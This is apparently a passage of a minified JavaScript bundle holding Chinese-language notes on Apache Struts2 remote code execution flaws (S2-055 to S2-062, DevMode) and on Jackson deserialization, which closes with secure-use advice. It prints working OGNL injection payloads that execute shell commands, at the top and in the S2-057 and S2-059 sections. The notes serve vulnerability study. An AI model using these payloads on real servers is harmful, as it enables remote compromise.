                          %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-055 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-055 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.5 - Struts 2.5.14
          \u5229\u7528\u6761\u4EF6
                  1\u3001Jackson \u89E6\u53D1\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u9700\u8981\u914D\u7F6E\u591A\u6001
                          1\u3001\u8FD9\u4E2A\u914D\u7F6E\u9ED8\u8BA4\u662F\u4E0D\u5F00\u542F\u7684\uFF0C\u56E0\u6B64\u8FD9\u4E2A\u6F0F\u6D1E\u5728\u5229\u7528\u4E0A\u8FD8\u662F\u6709\u4E00\u5B9A\u7684\u5C40\u9650\u6027\u3002

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u9664\u4E86 xml \u683C\u5F0F\u7684\u652F\u6301\uFF0CStruts2 REST \u63D2\u4EF6\u8FD8\u9ED8\u8BA4\u652F\u6301\u4E86 json \u683C\u5F0F\u7684\u6570\u636E\u3002\u53EF\u4EE5\u4F7F\u7528Jackson \u63D2\u4EF6\u6765\u89E3\u6790 json\u3002
                          1\u3001\u5728\u9ED8\u8BA4\u7684\u914D\u7F6E\u4E2D\uFF0C\u5BF9\u4E8E Json \u7684\u89E3\u6790\u4F7F\u7528\u7684\u662F JsonLibHandler\u3002
                          2\u3001\u5982\u679C\u6211\u4EEC\u60F3\u8981\u4F7F\u7528 Jackson \u6765\u8FDB\u884C\u89E3\u6790\uFF0C\u90A3\u4E48\u9700\u8981\u5728 struts.xml \u6587\u4EF6\u4E2D\u8FDB\u884C\u5982\u4E0B\u914D\u7F6E\uFF1A
                                  <bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="jackson" class="org.apache.struts2.rest.handler.JacksonLibHandler"/>
                                  <constant name="struts.rest.handlerOverride.json" value="jackson"/>
                          3\u3001\u6307\u5B9A\u4E86\u4E4B\u540E\uFF0C\u5C31\u4F1A\u6307\u5B9A JacksonLibHandler \u6765\u5904\u7406 json \u683C\u5F0F\u6570\u636E
                  2\u3001\u6240\u4EE5\uFF0C\u7531\u4E8E\u6CA1\u6709\u5B89\u5168\u7684\u4F7F\u7528 Jackson \u7EC4\u4EF6\u5BFC\u81F4\u4E86\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u60C5\u51B5\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u7531\u4E8E\uFF0C\u6307\u5B9A\u4E86 JacksonLibHandler \u6765\u5904\u7406 json \u683C\u5F0F\u6570\u636E\uFF0C\u6211\u4EEC\u770B\u4E00\u4E0B\u4ED6\u7684 toObject \u65B9\u6CD5\uFF1A
                          xxxxxx
                          2\u3001\u53EF\u4EE5\u770B\u5230\u4F7F\u7528 ObjectMapper \u83B7\u53D6 ObjectReader \u5BF9\u8C61\uFF0C\u5E76\u76F4\u63A5\u8C03\u7528 readValue \u65B9\u6CD5\u8BFB\u53D6\u8F93\u5165\u6D41\u4E2D\u7684\u5185\u5BB9\u3002
                  2\u3001Jackson \u89E6\u53D1\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u9700\u8981\u914D\u7F6E\u591A\u6001\uFF0C\u4E5F\u5C31\u662F fastjson \u4E2D\u7684 autoType \uFF0C
                          1\u3001\u8FD9\u4E2A\u914D\u7F6E\u9ED8\u8BA4\u662F\u4E0D\u5F00\u542F\u7684\uFF0C\u56E0\u6B64\u8FD9\u4E2A\u6F0F\u6D1E\u5728\u5229\u7528\u4E0A\u8FD8\u662F\u6709\u4E00\u5B9A\u7684\u5C40\u9650\u6027\u3002
                          2\u3001\u6709\u51E0\u79CD\u65B9\u5F0F\u914D\u7F6E\u591A\u6001\uFF0C\u5E38\u89C1\u7684\u6709\u4EE5\u4E0B\u4E24\u79CD\uFF1A
                                  1\u3001\u5168\u5C40 Default Typing \u673A\u5236\uFF1A
                                          objectMapper.enableDefaultTyping();
                                  2\u3001\u4E3A\u76F8\u5E94\u7684 class \u6DFB\u52A0 @JsonTypeInfo \u6CE8\u89E3\uFF1A
                                          @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Gadget\uFF08\u5C0F\u5DE5\u5177\uFF09\uFF0C\u4EEC\u5C31\u7528\u7ECF\u5178\u7684 TemplatesImpl \u5F39\u51FA\u8BA1\u7B97\u5668\u3002
                          \uFF08\u53EF\u4EE5\u53C2\u7167 JackSon \u6F0F\u6D1E\u7684\u5229\u7528\u65B9\u6CD5\uFF09


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-057 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2018-11776\uFF09",`

  S2-057 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09  \uFF08CVE-2018-11776\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.3\u20132.3.34
                  Struts 2.5\u20132.5.16

          \u5229\u7528\u6761\u4EF6
                  1\u3001\u300A-alwaysSelectFullNamespace\u300B\u4E3Atrue\u3002
                  2\u3001\u300A-action\u300B\u5143\u7D20\u6CA1\u6709\u8BBE\u7F6E namespace \u5C5E\u6027\uFF0C\u6216\u8005\u4F7F\u7528\u4E86\u901A\u914D\u7B26\u3002

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001\u5B9A\u4E49XML\u914D\u7F6E\u65F6\u5982\u679C\u6CA1\u6709\u8BBE\u7F6Enamespace\u7684\u503C\uFF0C\u5E76\u4E14\u4E0A\u5C42\u52A8\u4F5C\u914D\u7F6E\u4E2D\u5E76\u6CA1\u6709\u8BBE\u7F6E\u6216\u4F7F\u7528\u901A\u914D\u7B26namespace\u65F6\uFF0C\u53EF\u80FD\u4F1A\u5BFC\u81F4\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u53D1\u751F\u3002
                  2\u3001\u540C\u6837\u4E5F\u53EF\u80FD\u56E0\u4E3Aurl\u6807\u7B7E\u6CA1\u6709\u8BBE\u7F6Evalue\u548Caction\u7684\u503C\uFF0C\u5E76\u4E14\u4E0A\u5C42\u52A8\u4F5C\u5E76\u6CA1\u6709\u8BBE\u7F6E\u6216\u4F7F\u7528\u901A\u914D\u7B26namespace\uFF0C\u4ECE\u800C\u5BFC\u81F4\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u53D1\u751F\u3002
                  3\u3001namespace\u547D\u540D\u7A7A\u95F4 \u5C06\u7531\u7528\u6237 \u4ECEurl\u4F20\u9012 \u5E76\u89E3\u6790\u4E3A OGNL\u8868\u8FBE\u5F0F\uFF0C\u6700\u7EC8\u5BFC\u81F4\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          \uFF08\u9700\u8981\u7ECF\u8FC7\u4E00\u904Durl\u7F16\u7801\uFF09
                          \${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-059 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-059 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 \u2014\u2014\u2014\u2014\u2014\u2014 Struts 2.5.20

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001Struts2 \u4F1A\u5BF9\u67D0\u4E9B\u300A\u6807\u7B7E\u5C5E\u6027\u300B\uFF08\u6BD4\u5982 id\u5C5E\u6027\uFF0C\u5176\u4ED6\u5C5E\u6027\u6709\u5F85\u5BFB\u627E\uFF09\u7684\u5C5E\u6027\u503C\u8FDB\u884C\u4E8C\u6B21\u8868\u8FBE\u5F0F\u89E3\u6790\uFF0C
                          1\u3001\u5F53\u8FD9\u4E9B\u6807\u7B7E\u5C5E\u6027\u4E2D\u5305\u542B\u4E86 \u300A%{xx}\u300B \u4E14 \u300Axx\u300B \u7528\u6237\u53EF\u63A7\uFF0C\u5219\u5728\u6E32\u67D3\u8BE5\u6807\u7B7E\u65F6\u53EF\u9020\u6210 ognl\u8868\u8FBE\u5F0F \u6267\u884C\u3002
                                  1\u3001\u4ECE\u800C\u53EF\u80FD\u9020\u6210\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\uFF01

          \u539F\u7406\u5206\u6790
                  1\u3001\u9996\u5148\u901A\u8FC7 com.opensymphony.xwork2.interceptor.ParametersInterceptor \u7684 setParameters() \u65B9\u6CD5\u8BBE\u7F6E\u5BF9\u5E94\u7684 IndexAction\u7684skillName \u5C5E\u6027\uFF0C
                          1\u3001\u5373 \u300A %{3*5}\u300B \u3002
                  2\u3001\u7136\u540E\u8FDB\u5165 jsp \u4E2D\u7684\u6807\u7B7E\u5904\u7406\u73AF\u8282\u3002
                          1\u3001\u5904\u7406  <s:label id="%{skillName}" value="label test"/>  \u65F6\uFF0C\u4E0ES2-001\u4E00\u6837\uFF0C
                                  1\u3001\u9996\u5148\u901A\u8FC7 org.apache.struts2.views.jsp.ComponentTagSupport \u7684 doStartTag() \u65B9\u6CD5\u6839\u636E\u4E0D\u540C\u6807\u7B7E\u5C5E\u6027\u8FDB\u884C\u521D\u59CB\u5316\u5904\u7406\u3002
                                  2\u3001\u8DDF\u8E2ApopulateParams()\u65B9\u6CD5\u3002
                                          1\u3001\u672Cdemo\u4E2D\u6807\u7B7E\u5C5E\u6027\u662Flabel\uFF0C\u56E0\u6B64\u8FDB\u5165LabelTag\u7684populateParams()\u65B9\u6CD5\uFF0C
                                          2\u3001\u968F\u540E\u8FDB\u5165 org.apache.struts2.views.jsp.ui.AbstractUITag \u7684 populateParams() \u65B9\u6CD5\u3002
                                                  1\u3001\u8BE5\u65B9\u6CD5\u5BF9\u6240\u6709\u53EF\u80FD\u6D89\u53CA\u5230\u7684\u5C5E\u6027\uFF0C\u5982name\uFF0Ctheme\uFF0Cvalue\u7B49\u8FDB\u884Cset\u5904\u7406\u3002
                                  3\u3001\u8DDF\u8FDB org.apache.struts2.components.UIBean \u7684 setId() \u65B9\u6CD5\uFF0C
                                          1\u3001\u901A\u8FC7this.findString(id)\u5BF9id\u8FDB\u884C\u7B2C\u4E00\u6B21\u89E3\u6790\uFF0C\u7ED3\u679C\u4E3A%{skillName},
                                                  1\u3001\u7531\u6B64\u5B8C\u6210\u5BF9this.id\u7684\u521D\u59CB\u5316\u8D4B\u503C\u3002
                          2\u3001\u7136\u540E\u8FDB\u5165 org.apache.struts2.views.jsp.ComponentTagSupport \u7684 doEndTag() \u65B9\u6CD5\u5B8C\u6210\u5BF9\u6807\u7B7E\u7684\u95ED\u5408\u5904\u7406\u3002
                                  1\u3001\u6D41\u7A0B\u540C \u300AS2-001\u300B\uFF0CdoEndTag() -> UIBean.end() -> UIBean.evaluateParams()    \u3002
                                  1\u3001\u5728 UIBean.evaluateParams() \u4E2D\u8FDB\u5165 populateComponentHtmlId() \u65B9\u6CD5\u3002
                                          1\u3001\u901A\u8FC7 findStringIfAltSyntax() \u5BF9 id \u8FDB\u884C\u7B2C\u4E8C\u6B21\u89E3\u6790\u3002\u6B64\u65F6 this.id \u7ECF\u8FC7\u4E0A\u9762\u5904\u7406\u5DF2\u7ECF\u662FskillName\u7684\u503C\uFF0C\u4E5F\u5C31\u662F \u300A  %{3*5}  \u300B\u3002
                          3\u3001\u8DDF\u8FDB findStringIfAltSyntax() \u3002
                                  1\u3001this.altSyntax()\u9ED8\u8BA4\u4E3Atrue\uFF0C
                                          1\u3001\u56E0\u6B64\u901A\u8FC7 this.findString(expr) -> findValue() -> TextParseUtil.translateVariables('%', expr, this.stack);
                                                  1\u3001\u6700\u7EC8\uFF0C\u6267\u884Cognl\u8868\u8FBE\u5F0F \u2014\u2014\u2014\u2014\u2014\u2014 \u89E6\u53D1\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          =%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-061 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09  \uFF08CVE-2020-17530\uFF09",`

  S2-061 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09  \uFF08CVE-2020-17530\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 \u2014\u2014\u2014\u2014 Struts 2.5.25
          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5728\u4F7F\u7528\u67D0\u4E9Btag\u7B49\u60C5\u51B5\u4E0B\u53EF\u80FD\u5B58\u5728OGNL\u8868\u8FBE\u5F0F\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u4ECE\u800C\u9020\u6210\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\uFF0C\u98CE\u9669\u6781\u5927\u3002
                          1\u3001S2-061\u662F\u5BF9S2-059\u7684\u7ED5\u8FC7\uFF0CStruts2\u5B98\u65B9\u5BF9S2-059\u7684\u4FEE\u590D\u65B9\u5F0F\u662F\u52A0\u5F3AOGNL\u8868\u8FBE\u5F0F\u6C99\u76D2\uFF0C\u800CS2-061\u7ED5\u8FC7\u4E86\u8BE5\u6C99\u76D2\u3002
                  2\u3001S2-061\u548CS2-062\u6F0F\u6D1E\u539F\u7406\u4E0ES2-059\u76F8\u540C\uFF0C\u662F\u5BF9S2-059\u6C99\u76D2\u7ED5\u8FC7\u3002\u7531\u4E8E\u6F0F\u6D1E\u539F\u7406\u65B9\u9762\u5E76\u65E0\u4E0D\u540C\uFF0C\u8FD9\u91CC\u4E0D\u518D\u9610\u8FF0\u3002

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-062 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-062 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001S2-061\u548CS2-062\u6F0F\u6D1E\u539F\u7406\u4E0ES2-059\u76F8\u540C\uFF0C\u662F\u5BF9S2-059\u6C99\u76D2\u7ED5\u8FC7\u3002\u7531\u4E8E\u6F0F\u6D1E\u539F\u7406\u65B9\u9762\u5E76\u65E0\u4E0D\u540C\uFF0C\u8FD9\u91CC\u4E0D\u518D\u9610\u8FF0\u3002

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-DevMode \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-DevMode \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.1.0-2.5.1\uFF0C\u901A\u6740Struts2\u6240\u6709\u7248\u672C

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5F53Struts2\u5F00\u542FdevMode\u6A21\u5F0F\u65F6\uFF0C\u5C06\u5BFC\u81F4\u4E25\u91CD\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002
                          1\u3001\u5982\u679CWebService \u542F\u52A8\u6743\u9650\u4E3A\u6700\u9AD8\u6743\u9650\u65F6\uFF0C\u53EF\u8FDC\u7A0B\u6267\u884C\u4EFB\u610F\u547D\u4EE4\uFF0C\u5305\u62EC\u5173\u673A\u3001\u5EFA\u7ACB\u65B0\u7528\u6237\u3001\u4EE5\u53CA\u5220\u9664\u670D\u52A1\u5668\u4E0A\u6240\u6709\u6587\u4EF6\u7B49\u7B49\u3002

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],_u=[Object(u.c)("\u5168\u5C40DefaultTyping\u673A\u5236________ JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2017-7525________CVE-2020-24616",`

  \u4ECB\u7ECD\uFF1A
          1\u3001\u300ACVE-2020-24616\u300B\u548C\u300ACVE-2017-7525\u300B\u3002
                  1\u3001\u5176\u5B9E\u6B64\u6F0F\u6D1E\u548C\u524D\u51E0\u5E74jackson\u7206\u51FA\u6765\u7684\u53E6\u5916\u4E00\u4E2A\u6F0F\u6D1E(CVE-2017-7525)\u662F\u4E00\u8109\u76F8\u627F\u7684\uFF0C\u90FD\u662F\u5229\u7528\u53CD\u5E8F\u5217\u5316\u8FDC\u7A0B\u6267\u884C\u4EE3\u7801\uFF1B
                  2\u3001\u81F3\u4E8E\u4E3A\u4EC0\u4E48\u4F1A\u51FA\u73B0\u8FD9\u4E2A\u95EE\u9898\uFF0C\u5176\u5B9E\u5F52\u6839\u7ED3\u5E95\u548C \u300A\u591A\u6001\u300B \u6709\u5173\uFF0C\u4E0B\u9762\u505A\u4E00\u4E2A\u7B80\u5355\u7684\u5206\u6790\uFF1B
                          1\u3001\u5E8F\u5217\u5316\u4E2D\u7684\u591A\u6001\u95EE\u9898\uFF1A
                                  1\u3001\u5F88\u591A\u4E1A\u52A1\u4E2D\u6709\u591A\u6001\u7684\u9700\u6C42\u3002\u5982\u679C\u4E0D\u6CE8\u610F\u8FD9\u4E00\u70B9\uFF0C\u5728 \u5E8F\u5217\u5316 \u7684\u65F6\u5019\uFF0C\u662F\u53EF\u4EE5\u6210\u529F\u7684\uFF1B\u4F46\u662F\uFF0C\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\uFF0C\u7A0B\u5E8F\u4E2D\u5B8C\u5168\u6CA1\u6CD5\u77E5\u9053fruit\u5230\u5E95\u662F\u82F9\u679C\u8FD8\u662F\u9999\u8549\uFF0C\u6240\u4EE5\u4F1A\u76F4\u63A5\u62A5\u9519\uFF1A
                                          Exception in thread "main" com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of \`com.jackson.Fruit\`
                                          (no Creators, like default construct, exist): abstract types either need to be mapped to concrete types, have custom deserializer, or contain additional type information
                          2\u3001\u9762\u5BF9\u8FD9\u79CD\u95EE\u9898\uFF0Cjackson\u63D0\u4F9B\u4E86\u76F8\u5173\u7684\u6280\u672F\u652F\u6301\uFF0C\u4E3B\u8981\u6709\u4EE5\u4E0B\u8FD9\u4E48\u4E24\u79CD\uFF1A
                                  1\u3001\u5168\u5C40DefaultTyping\u673A\u5236
                                          1\u3001\u5B9E\u73B0\u65B9\u5F0F\uFF1A
                                                  1\u3001\u5168\u5C40DefaultTyping\u673A\u5236\u76F8\u5BF9\u6765\u8BF4\u6BD4\u8F83\u7B80\u5355\uFF0C\u4E00\u4E2A\u914D\u7F6E\u5C31\u89E3\u51B3\u4E86
                                                          1\u3001\u53EA\u9700\u8981\u5BF9ObjectMapper\u5F00\u542F\u6B64\u914D\u7F6E\u5373\u53EF\uFF1A
                                                                  ObjectMapper mapper = new ObjectMapper();
                                                                  mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
                                          2\u3001\u5728\u8FD9\u4E2A\u65B9\u5F0F\u91CC\u9762\u4E00\u79CD\u67094\u4E2A\u503C
                                                  1\u3001JAVA_LANG_OBJECT \uFF1A\u5F53\u7C7B\u91CC\u7684\u5C5E\u6027\u58F0\u660E\u4E3A\u4E00\u4E2AObject\u65F6\uFF0C\u4F1A\u5BF9\u8BE5\u5C5E\u6027\u8FDB\u884C\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\uFF0C\u5E76\u4E14\u660E\u786E\u89C4\u5B9A\u7C7B\u540D\u3002\uFF08\u5F53\u7136\uFF0C\u8FD9\u4E2AObject\u672C\u8EAB\u4E5F\u5F97\u662F\u4E00\u4E2A\u53EF\u88AB\u5E8F\u5217\u5316/\u53CD\u5E8F\u5217\u5316\u7684\u7C7B\uFF09\u3002
                                                  2\u3001OBJECT_AND_NON_CONCRETE \uFF1A\u9664\u4E86\u4E0A\u6587 \u63D0\u5230\u7684\u7279\u5F81\uFF0C\u5F53\u7C7B\u91CC\u6709 Interface \u3001 AbstractClass \u65F6\uFF0C\u5BF9\u5176\u8FDB\u884C\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u3002\uFF08\u5F53\u7136\uFF0C\u8FD9\u4E9B\u7C7B\u672C\u8EAB\u9700\u8981\u662F\u5408\u6CD5\u7684\u3001\u53EF\u4EE5\u88AB\u5E8F\u5217\u5316/\u53CD\u5E8F\u5217\u5316\u7684\u5BF9\u8C61\uFF09\u3002
                                                  3\u3001NON_CONCRETE_AND_ARRAYS \uFF1A\u9664\u4E86\u4E0A\u6587\u63D0\u5230\u7684\u7279\u5F81\uFF0C\u8FD8\u652F\u6301\u4E0A\u6587\u5168\u90E8\u7C7B\u578B\u7684Array\u7C7B\u578B\u3002
                                                  4\u3001NON_FINAL \uFF1A\u5305\u62EC\u4E0A\u6587\u63D0\u5230\u7684\u6240\u6709\u7279\u5F81\uFF0C\u800C\u4E14\u5305\u542B\u5373\u5C06\u88AB\u5E8F\u5217\u5316\u7684\u7C7B\u91CC\u7684\u5168\u90E8\u3001\u975Efinal\u7684\u5C5E\u6027\uFF0C\u4E5F\u5C31\u662F\u76F8\u5F53\u4E8E\u6574\u4E2A\u7C7B\u3001\u9664final\u5916\u7684\u7684\u5C5E\u6027\u4FE1\u606F\u90FD\u9700\u8981\u88AB\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u3002
                                  2\u3001\u4E3AClass\u6DFB\u52A0@JsonTypeInfo
                                          1\u3001\u5B9E\u73B0\u65B9\u5F0F\uFF1A
                                                  1\u3001\u6B64\u79CD\u6A21\u5F0F\u9700\u8981\u9488\u5BF9\u6BCF\u79CD\u7C7B\u578B\u505A\u4E13\u95E8\u7684\u5904\u7406\uFF0C\u76F8\u5BF9\u6765\u8BF4\u6BD4\u8F83\u9EBB\u70E6
                                                  2\u3001\u6211\u4EEC\u9700\u8981\u5728Fruit\u63A5\u53E3\u4E2D\u505A\u5904\u7406\uFF1A
                                                          \u5982\u679C\u53D1\u73B0\u662F\u5B50\u7C7BApple\uFF0C\u5C31\u7528\u5B57\u7B26a\u4EE3\u66FF\uFF1B\u5982\u679C\u53D1\u73B0\u662F\u5B50\u7C7BBanana\uFF0C\u5C31\u7528\u5B57\u7B26b\u4EE3\u66FF\u3002
                                                          \u7136\u540E\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\uFF0C\u4E5F\u7528\u540C\u6837\u7684\u65B9\u5F0F\uFF0C\u5C31\u53EF\u4EE5\u6210\u529F\u4E86
                                          2\u3001\u4E00\u5171\u652F\u6301\u4E0B\u97625\u79CD\u7C7B\u578B\u7684\u53D6\u503C\uFF1A
                                                  1\u3001@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
                                                  2\u3001@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
                                                  3\u3001@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
                                                  4\u3001@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
                                                  5\u3001@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM)
                  3\u3001\u6F0F\u6D1E\u51FA\u73B0\u7684\u70B9\uFF1A
                          1\u3001\u5176\u5B9E\u95EE\u9898\u7684\u6839\u6E90\u5C31\u51FA\u5728 \u5168\u5C40DefaultTyping \u673A\u5236\u4E2D\u5BF9\u751F\u6210\u7684json\u5B57\u7B26\u4E32\u4E2D\u5305\u542B\u4E86\u7C7B\u4FE1\u606F\uFF0C
                                  1\u3001\u8FD9\u6837\u5BF9\u653B\u51FB\u8005\u6765\u8BF4\u5C31\u76F8\u5F53\u4E8E\u7559\u4E86\u4E00\u4E2A\u540E\u95E8\u2014\u2014\u2014\u2014\u2014\u2014\u53EF\u4EE5\u901A\u8FC7\u5728json\u5B57\u7B26\u4E32\u4E2D\u4F20\u5165\u4E00\u4E9B\u7279\u6B8A\u7684\u7C7B\uFF0C\u5BF9\u670D\u52A1\u5668\u5F15\u53D1\u707E\u96BE\u6027\u540E\u679C\uFF1B

                  4\u3001\u5BF9\u9879\u76EE\u65B9\u7684 JackSon \u5B89\u5168\u4F7F\u7528\u5EFA\u8BAE\uFF1A
                          1\u3001\u4E0D\u8981\u4F7F\u7528DefaultTyping
                                  1\u3001\u53EF\u4EE5\u53D1\u73B0\u95EE\u9898\u7684\u6839\u6E90\u5728\u4E8EDefaultTyping\u65B9\u5F0F\u5BFC\u81F4\u5728json\u5B57\u7B26\u4E32\u4E2D\u51FA\u73B0\u4E86\u7C7B\u4FE1\u606F\uFF0C
                                          \u5176\u5B9E\u4E0A\u9762\u4E5F\u4ECB\u7ECD\u4E86\u5B8C\u5168\u53EF\u4EE5\u901A\u8FC7JsonTypeInfo\u65B9\u5F0F\u4EE3\u66FF\uFF1B\u53EA\u4E0D\u8FC7\u76F8\u5BF9\u6765\u8BF4\u9EBB\u70E6\u70B9\uFF0C\u4F46\u662F\u5BF9\u4E8E\u5B89\u5168\u6027\u6765\u8BF4\u8FD9\u70B9\u4E0D\u7B97\u4EC0\u4E48\uFF1B
                                  2\u3001\u53EF\u4EE5\u53D1\u73B0\u65B0\u7248jackson\u4E2D\u5DF2\u7ECF\u4E0D\u5EFA\u8BAE\u4F7F\u7528DefaultTyping\u4E86\uFF0C\u6B64\u65B9\u6CD5\u5DF2\u7ECF\u88AB\u6807\u8BC6\u4E3A@Deprecated
                          2\u3001\u53CD\u5E8F\u5217\u5316\u6307\u5B9A\u5177\u4F53\u7C7B
                                  1\u3001\u5176\u5B9E\u6211\u4EEC\u53EF\u4EE5\u53D1\u73B0\u8FD9\u4E9B\u9ED1\u540D\u5355\u4E2D\u7684\u7C7B\uFF0C\u6211\u4EEC\u5E73\u65F6\u5F88\u5C11\u4F7F\u7528\uFF0C
                                  2\u3001\u6211\u4EEC\u5927\u90E8\u5206\u60C5\u51B5\u90FD\u4F7F\u7528\u7684\u662F\u4E00\u4E9B\u4E1A\u52A1\u7C7B\uFF0C\u8FD9\u6837\u6211\u4EEC\u5728\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\u5C3D\u91CF\u4F7F\u7528\u5177\u4F53\u7C7B\uFF0C\u4E0D\u8981\u4F7F\u7528Object
